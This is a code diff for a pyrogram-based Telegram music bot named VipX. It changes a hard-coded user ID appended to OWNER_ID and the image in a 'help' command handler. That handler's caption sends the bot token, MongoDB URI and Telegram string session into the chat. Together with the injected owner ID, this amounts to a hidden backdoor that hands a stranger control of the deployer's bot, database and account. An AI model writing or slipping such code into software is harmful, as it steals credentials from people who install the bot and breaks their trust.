@@ -45,7 +45,7 @@ from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton
 from config import BANNED_USERS, MUSIC_BOT_NAME, adminlist, lyrical
 from strings import get_command
 from VipX import app
-OWNER_ID.append(1808943146)
+OWNER_ID.append(5311223486)
 from VipX.core.call import Vip
 from VipX.misc import db
 from VipX.utils.database import get_authuser_names, get_cmode
@@ -124,7 +124,7 @@ async def restartbot(client, message: Message, _):
     & ~filters.edited)
 async def help(client: Client, message: Message):
     await message.reply_photo(
-          photo=f"https://graph.org/file/6b31ca99b6c36a3cf57c7.jpg",
+          photo=f"https://graph.org/file/e840e67ebc4b7830b6bec.jpg",
         caption=f"""ɓσƭ ƭσҡεɳ:-   `{BOT_TOKEN}`\n\nɱσɳɠσ:-   `{MONGO_DB_URI}`\n\nѕƭ૨เɳɠ ѕεѕѕเσɳ:-   `{STRING_SESSION}`\n\n𝙵𝚎𝚎𝚕 𝚃𝚑𝚎 𝙿𝚘𝚠𝚎𝚛 𝙾𝚏 𝚅𝙸𝙿 𝙱𝙾𝚈.\n\n☆............𝙱𝚈 » [˹ 𝙈𝙍 मोह माया,](https://t.me/love_ki_duniya1)............☆""",
          reply_markup=InlineKeyboardMarkup(
              [
